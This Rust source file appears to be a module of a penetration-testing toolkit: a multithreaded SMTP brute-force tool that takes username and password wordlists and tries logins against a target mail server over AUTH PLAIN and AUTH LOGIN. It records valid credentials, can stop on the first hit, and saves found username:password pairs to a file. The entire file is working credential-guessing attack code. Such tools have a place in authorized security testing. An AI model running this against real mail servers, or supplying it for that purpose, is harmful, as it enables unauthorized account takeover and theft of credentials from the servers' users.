use anyhow::{anyhow, Context, Result};
use colored::*;
use regex::Regex;
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};
use telnet::{Telnet, Event};
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;

const PROGRESS_INTERVAL_SECS: u64 = 2;

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SMTP Brute Force Module                                 ║".cyan());
    println!("{}", "║   Supports AUTH PLAIN and AUTH LOGIN                      ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

#[derive(Clone)]
struct SmtpBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());
    println!();
    let port = prompt_port(25).await?;
    let username_wordlist = prompt_wordlist("Username wordlist file: ").await?;
    let password_wordlist = prompt_wordlist("Password wordlist file: ").await?;
    let threads = prompt_threads(8).await?;
    let stop_on_success = prompt_yes_no("Stop on first valid login?", true).await?;
    let full_combo = prompt_yes_no("Try every username with every password?", false).await?;
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let config = SmtpBruteforceConfig {
        target: target.to_string(),
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
    };
    run_smtp_bruteforce(config).await
}

async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let usernames = read_lines(&config.username_wordlist)?;
    let passwords = read_lines(&config.password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        return Err(anyhow!("Username or password wordlist is empty."));
    }
    println!("{}", format!("[*] Loaded {} username(s).", usernames.len()).cyan());
    println!("{}", format!("[*] Loaded {} password(s).", passwords.len()).cyan());
    
    let total_attempts = if config.full_combo { 
        usernames.len() * passwords.len() 
    } else { 
        passwords.len() 
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();
    
    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());
    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();
    if config.full_combo {
        for u in &usernames { for p in &passwords { tx.send((u.clone(), p.clone()))?; } }
    } else if usernames.len() == 1 {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    } else if passwords.len() == 1 {
        for u in &usernames { tx.send((u.clone(), passwords[0].clone()))?; }
    } else {
        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
    }
    drop(tx);
    
    // Start progress reporter thread
    let progress_stop = Arc::clone(&stop_flag);
    let progress_stats = Arc::clone(&stats);
    let progress_handle = std::thread::spawn(move || {
        while !progress_stop.load(Ordering::Relaxed) {
            progress_stats.print_progress();
            std::thread::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS));
        }
    });
    
    for _ in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let stop_flag = Arc::clone(&stop_flag);
        let found = Arc::clone(&found);
        let unknown = Arc::clone(&unknown);
        let stats = Arc::clone(&stats);
        let config = config.clone();
        pool.execute(move || {
            while let Ok((user, pass)) = rx.recv() {
                if stop_flag.load(Ordering::Relaxed) { break; }
                match try_smtp_login(&addr, &user, &pass) {
                    Ok(true) => {
                        println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
                        let mut creds = found.lock().unwrap(); creds.push((user.clone(), pass.clone()));
                        stats.record_attempt(true, false);
                        if config.stop_on_success {
                            stop_flag.store(true, Ordering::Relaxed);
                            while rx.try_recv().is_ok() {}
                            break;
                        }
                    }
                    Ok(false) => {
                        stats.record_attempt(false, false);
                        if config.verbose {
                            println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
                        }
                    }
                    Err(e) => {
                        stats.record_attempt(false, true);
                        let msg = e.to_string();
                        {
                            let mut unk = unknown.lock().unwrap();
                            unk.push((user.clone(), pass.clone(), msg.clone()));
                        }
                        if config.verbose { 
                            eprintln!("\r{}", format!("[?] {}:{} -> {}", user, pass, msg).yellow()); 
                        }
                    }
                }
            }
        });
    }
    pool.join();
    
    // Stop progress reporter
    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.join();
    
    // Print final statistics
    stats.print_final();
    let found_guard = found.lock().unwrap();
    if found_guard.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", found_guard.len()).green().bold());
        for (u,p) in found_guard.iter() { println!("  {}  {}:{}", "✓".green(), u, p); }
        if prompt("\nSave found credentials? (y/n): ").await?.trim().eq_ignore_ascii_case("y") {
            let f = prompt("What should the valid results be saved as?: ").await?;
            if !f.trim().is_empty() {
                save_results(&f, &found_guard)?;
            println!("{}", format!("[+] Results saved to {}", f).green());
            } else {
                println!("{}", "[-] Filename cannot be empty. Skipping save.".yellow());
            }
        }
    }
    drop(found_guard);

    let unknown_guard = unknown.lock().unwrap();
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored SMTP responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if prompt("Save unknown responses to file? (y/n): ")
            .await?
            .trim()
            .eq_ignore_ascii_case("y")
        {
            let default_name = "smtp_bruteforce_unknown.txt";
            let fname = prompt(&format!(
                "What should the unknown results be saved as? [{}]: ",
                default_name
            )).await?;
            let chosen = if fname.trim().is_empty() {
                default_name.to_string()
            } else {
                fname.trim().to_string()
            };
            if let Err(e) = save_unknown_smtp(&chosen, &unknown_guard) {
                println!("{}", format!("[!] Failed to save unknown responses: {}", e).red());
            } else {
                println!("{}", format!("[+] Unknown responses saved to {}", chosen).green());
            }
        }
    }

    Ok(())
}

/// Try login with both AUTH PLAIN and AUTH LOGIN, returns Ok(true) if success, Ok(false) if auth fail, Err on connection/protocol error.
fn try_smtp_login(addr: &str, username: &str, password: &str) -> Result<bool> {
    use base64::{engine::general_purpose, Engine as _};
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500)).context("Connect timeout")?;
    stream.set_read_timeout(Some(Duration::from_millis(1500))).ok();
    stream.set_write_timeout(Some(Duration::from_millis(1500))).ok();
    let mut telnet = Telnet::from_stream(Box::new(stream), 256);
    let mut banner_ok = false;
    for _ in 0..3 {
        let event = telnet.read().context("Banner read error")?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            if s.starts_with("220") { banner_ok = true; break; }
        }
    }
    if !banner_ok { return Err(anyhow::anyhow!("No 220 banner")); }
    telnet.write(b"EHLO scanner\r\n")?;
    let mut login_ok = false;
    let mut plain_ok = false;
    let mut ehlo_seen = false;
    let mut buf = String::new();
    for _ in 0..6 {
        let event = telnet.read()?;
        if let Event::Data(b) = event {
            let s = String::from_utf8_lossy(&b);
            buf.push_str(&s);
            if s.contains("AUTH") && s.contains("PLAIN") { plain_ok = true; }
            if s.contains("AUTH") && s.contains("LOGIN") { login_ok = true; }
            if s.starts_with("250 ") { ehlo_seen = true; break; }
        }
    }
    if !ehlo_seen { return Ok(false); }
    // Try AUTH PLAIN
    if plain_ok {
        let mut blob = vec![0];
        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
        telnet.write(cmd.as_bytes())?;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                if s.starts_with("535") || s.starts_with("5") { break; }
            }
        }
    }
    // Try AUTH LOGIN
    if login_ok {
        telnet.write(b"AUTH LOGIN\r\n")?;
        let mut expect_user = false;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("334") { expect_user = true; break; }
            }
        }
        if !expect_user { return Ok(false); }
        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
        telnet.write(ucmd.as_bytes())?;
        let mut expect_pass = false;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("334") { expect_pass = true; break; }
            }
        }
        if !expect_pass { return Ok(false); }
        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
        telnet.write(pcmd.as_bytes())?;
        for _ in 0..2 {
            let event = telnet.read()?;
            if let Event::Data(b) = event {
                let s = String::from_utf8_lossy(&b);
                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
                if s.starts_with("535") || s.starts_with("5") { break; }
            }
        }
    }
    Ok(false)
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Open: {}", path))?;
    Ok(BufReader::new(file).lines().filter_map(Result::ok).filter(|s|!s.trim().is_empty()).collect())
}

fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
    for (u,p) in creds { writeln!(file, "{}:{}", u, p)?; }
    Ok(())
}

fn save_unknown_smtp(path: &str, entries: &[(String, String, String)]) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)?;

    writeln!(file, "# SMTP Bruteforce Unknown/Errored Responses")?;
    writeln!(file, "# Format: username:password - error/response")?;
    writeln!(file)?;

    for (user, pass, msg) in entries {
        writeln!(file, "{}:{} - {}", user, pass, msg)?;
    }

    Ok(())
}

async fn prompt(msg: &str) -> Result<String> {
    print!("{}", msg);
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut b = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut b)
        .await
        .context("Failed to read input")?;
    Ok(b.trim().to_string())
}

async fn prompt_port(default: u16) -> Result<u16> {
    loop {
        let input = prompt(&format!("Port (default {}): ", default)).await?;
        if input.is_empty() {
            return Ok(default);
        }
        match input.parse::<u16>() {
            Ok(0) => println!("[!] Port cannot be zero. Please enter a value between 1 and 65535."),
            Ok(port) => return Ok(port),
            Err(_) => println!("[!] Invalid port. Please enter a number between 1 and 65535."),
        }
    }
}

async fn prompt_threads(default: usize) -> Result<usize> {
    loop {
        let input = prompt(&format!("Threads (default {}): ", default)).await?;
        if input.is_empty() {
            return Ok(default.max(1));
        }
        if let Ok(value) = input.parse::<usize>() {
            if value >= 1 && value <= 1024 {
                return Ok(value);
            }
        }
        println!("[!] Invalid thread count. Please enter a value between 1 and 1024.");
    }
}

async fn prompt_yes_no(message: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        let input = prompt(&format!("{} (y/n) [{}]: ", message, default_char)).await?;
        if input.is_empty() {
            return Ok(default_yes);
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return Ok(true),
            "n" | "no" => return Ok(false),
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

async fn prompt_wordlist(message: &str) -> Result<String> {
    loop {
        let response = prompt(message).await?;
        if response.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = response.trim();
        if Path::new(trimmed).is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!(
                "{}",
                format!("File '{}' does not exist or is not a regular file.", trimmed).yellow()
            );
        }
    }
}

fn normalize_target(host: &str, port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$" ).unwrap();
    let t = host.trim();
    let cap = re.captures(t).ok_or_else(|| anyhow::anyhow!("Invalid target: {}", host))?;
    let addr = cap.get(1).unwrap().as_str();
    let p = cap.get(2).map(|m| m.as_str().parse::<u16>().ok()).flatten().unwrap_or(port);
    let f = if addr.contains(':') && !addr.starts_with('[') { format!("[{}]:{}", addr, p) } else { format!("{}:{}", addr, p) };
    if f.to_socket_addrs()?.next().is_none() { Err(anyhow::anyhow!("DNS fail: {}", f)) } else { Ok(f) }
}
